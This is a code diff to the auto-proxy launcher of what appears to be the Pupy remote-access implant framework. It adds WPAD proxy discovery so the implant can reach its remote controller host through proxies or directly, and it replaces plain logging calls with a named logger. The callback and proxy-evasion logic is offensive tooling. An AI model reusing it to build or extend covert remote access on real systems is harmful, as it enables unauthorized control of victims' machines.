@@ -10,11 +10,21 @@ from network.lib import utils
 
 from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
 from ..clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, PupyProxifiedSSLClient
-from ..proxies import get_proxies, find_default_proxy
+from ..proxies import get_proxies, find_default_proxy, get_proxy_for_address
 
 import logging
 
-def find_proxies(additional_proxies=None):
+logger = logging.getLogger('pupy.network.auto_proxy')
+
+def find_proxies(additional_proxies=None, url=None):
+    wpad_proxies = get_proxy_for_address(url)
+    logger.info('URL: %s WPAD: %s ADDITIONAL: %s', url, wpad_proxies, additional_proxies)
+
+    if wpad_proxies:
+        logger.info('WPAD for %s: %s', url, wpad_proxies)
+        for proxy_info in wpad_proxies:
+            yield proxy_info
+
     proxy_info = find_default_proxy()
     if proxy_info:
         yield proxy_info
@@ -65,8 +75,8 @@ class AutoProxyLauncher(BaseLauncher):
 
         # Try to find/use proxies
         for proxy_type, proxy, proxy_username, proxy_password in find_proxies(
-                additional_proxies=self.args.add_proxy
-            ):
+                additional_proxies=self.args.add_proxy, url='{host}:{port}'.format(
+                    host=self.rhost, port=self.rport)):
             try:
                 t = self.transports[self.args.transport]()
                 client_args = {
@@ -117,8 +127,8 @@ class AutoProxyLauncher(BaseLauncher):
 
                     chost, cport = self.rhost, self.rport
 
-                logging.info("using client options: %s"%client_args)
-                logging.info("using transports options: %s"%transport_args)
+                logger.info("using client options: %s"%client_args)
+                logger.info("using transports options: %s"%transport_args)
 
                 try:
                     t.parse_args(transport_args)
@@ -131,7 +141,7 @@ class AutoProxyLauncher(BaseLauncher):
                     #at this point we quit if we can't instanciate the client
                     raise SystemExit(e)
 
-                logging.info("connecting to %s:%s using transport %s and %s proxy %s:%s ..."%(
+                logger.info("connecting to %s:%s using transport %s and %s proxy %s:%s ..."%(
                     self.rhost, self.rport, self.args.transport, proxy_type, proxy_addr, proxy_port)
                 )
 
@@ -143,7 +153,7 @@ class AutoProxyLauncher(BaseLauncher):
                 raise
 
             except Exception as e:
-                logging.error(e)
+                logger.error(e)
 
         # Try without any proxy
         if not self.args.no_direct:
@@ -169,10 +179,10 @@ class AutoProxyLauncher(BaseLauncher):
                     elif val.lower() in t.client_transport_kwargs:
                         transport_args[val.lower()]=opt_args[val]
                     else:
-                        logging.warning("unknown transport argument : %s"%val)
+                        logger.warning("unknown transport argument : %s"%val)
 
-                logging.info("using client options: %s"%client_args)
-                logging.info("using transports options: %s"%transport_args)
+                logger.info("using client options: %s"%client_args)
+                logger.info("using transports options: %s"%transport_args)
                 try:
                     t.parse_args(transport_args)
                 except Exception as e:
@@ -183,7 +193,7 @@ class AutoProxyLauncher(BaseLauncher):
                 except Exception as e:
                     #at this point we quit if we can't instanciate the client
                     raise SystemExit(e)
-                logging.info("connecting to %s:%s using transport %s without any proxy ..."%(
+                logger.info("connecting to %s:%s using transport %s without any proxy ..."%(
                     self.rhost, self.rport, self.args.transport)
                 )
                 s=client.connect(self.rhost, self.rport)
@@ -192,4 +202,4 @@ class AutoProxyLauncher(BaseLauncher):
             except StopIteration:
                 raise
             except Exception as e:
-                logging.error(e)
+                logger.error(e)
